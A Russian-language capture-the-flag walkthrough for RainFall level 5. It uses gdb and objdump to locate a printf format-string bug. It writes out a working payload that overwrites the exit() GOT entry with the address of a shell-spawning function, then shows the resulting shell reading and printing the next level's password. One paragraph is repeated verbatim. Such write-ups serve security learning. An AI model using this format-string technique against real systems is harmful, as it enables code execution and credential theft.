Как и на уровне 3, мы можем найти исполняемый файл, ожидающий ввода, распечатать его и выйти после нажатия клавиши enter

Проанализировав его с помощью gdb, мы видим, что функция main() вызывает функцию с именем n(), но существует также не вызываемая функция o().

Main() вызывает только n(), не очень интересно, поэтому мы можем пропустить его.
Мы можем видеть вызов fgets() в n(), который защищает от атаки переполнения буфера.

   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>

После этого мы можем увидеть вызов функции printf(), которая уязвима для эксплойта строки формата

   0x080484f3 <+49>:    call   0x8048380 <printf@plt>

Затем не вызываемая функция o() запускает оболочку с помощью вызова system().

   0x080484b1 <+13>:    call   0x80483b0 <system@plt>

Нам нужно манипулировать функцией printf(), чтобы вызвать o(), используя атаку строки формата.
Наша главная проблема здесь заключается в том, что обе функции n() и o() никогда не возвращаются. Он выходит напрямую. Даже если мы перезапишем что-то с уязвимостью строки формата, мы, возможно, не сможем это использовать.
Мы можем заменить адрес выхода в GOT на адрес "o", для вызова его вместо выхода.
GOT (Таблица глобальных смещений) - это таблица адресов в разделе данных, она содержит адреса функций общей библиотеки.
Также GOT доступен для записи, и всякий раз, когда вызывается функция exit() (сначала просматривается запись функции GOT), программа переходит по этому адресу.
Поэтому, если мы заменим адрес exit() в GOT на адрес o() (с помощью строк формата), всякий раз, когда будет вызываться эта функция, программа перейдет к измененной записи GOT.
Во-первых: найдите адрес выхода() в GOT и адрес функции o().

exit():

#level5@RainFall:~$ objdump -R level5 | grep exit
#08049828 R_386_JUMP_SLOT   _exit
#08049838 R_386_JUMP_SLOT   exit
#level5@RainFall:~$

o():

#(gdb) info function o
#All functions matching regular expression "o":
#
#Non-debugging symbols:
#0x080483c0  __gmon_start__
#0x080483c0  __gmon_start__@plt
#0x08048420  __do_global_dtors_aux
#0x080484a4  o
#0x080485a0  __do_global_ctors_aux
#(gdb)

Теперь у нас есть адрес exit(): 0x8049838 и адрес o(): 0x080484a4.
Мы должны распечатать память до тех пор, пока не достигнем адреса exit() :

#level5@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
#level5@RainFall:~$ cat /tmp/exploit | ./level5
#aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
#level5@RainFall:~$

Адрес выхода() находится на 4-й позиции (61616161).
Наконец, наша окончательная атака на строку формата будет выглядеть так :

exit() GOT адрес (в конце строки): \x38\x98\x04\x08 (4 байта)
адрес o() в десятичной системе счисления: 134513824 (меньше 4 байт причина адреса выхода() в GOT) с модификатором %d + модификатор %n Это будет довольно длинная причина большого значения в десятичной системе счисления адреса o()

Адрес выхода() находится на 4-й позиции (61616161).
Наконец, наша окончательная атака на строку формата будет выглядеть так :

exit() GOT адрес (в конце строки): \x38\x98\x04\x08 (4 байта)
адрес o() в десятичной системе счисления: 134513824 (меньше 4 байт причина адреса выхода() в GOT) с модификатором %d + модификатор %n Это будет довольно длинная причина большого значения в десятичной системе счисления адреса o()

#level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
#level5@RainFall:~$ cat /tmp/exploit - | ./level5
#                                                                                                                                                                                                              512
#whoami
#level6
#cat /home/user/level6/.pass
#d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
#^C
#level5@RainFall:~$ su level6
